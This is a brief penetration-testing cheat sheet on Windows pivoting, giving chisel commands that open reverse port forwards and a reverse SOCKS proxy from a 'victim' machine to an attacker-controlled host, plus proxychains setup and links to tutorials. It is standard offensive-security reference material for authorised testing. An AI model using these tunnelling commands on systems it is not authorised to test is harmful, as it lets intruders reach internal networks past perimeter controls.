# Windows pivoting

### Chisel for Windows
https://github.com/jpillora/chisel/releases

```
Victims Box: .\chisel.exe client <attackersIP>:8011 R:1234:127.0.0.1:1234
Attackers Box: .\chisel.exe server -p 8011 --reverse
```

### ippsec demonstration Proxychains
https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=5446  

```
Attackers Box: ./chisel server -p 8000 --reverse
Victims Box: .\chisel.exe client <attackerIP>:8000 R:8001:127.0.0.1:1337
Victims Box: .\chisel.exe server -p 1337 --socks5
Attackers Box: ./chisel client 127.0.0.1:8001 socks
```

Standard Proxychains:  

https://medium.com/@vegardw/reverse-socks-proxy-using-chisel-the-easy-way-48a78df92f29  

```
./chisel server -p 8080 --reverse

.\chisel.exe client <IP>:8080 R:socks

Edit Proxychains config file:
/etc/proxychains.conf

Add the following:
socks5 127.0.0.1 1080
```
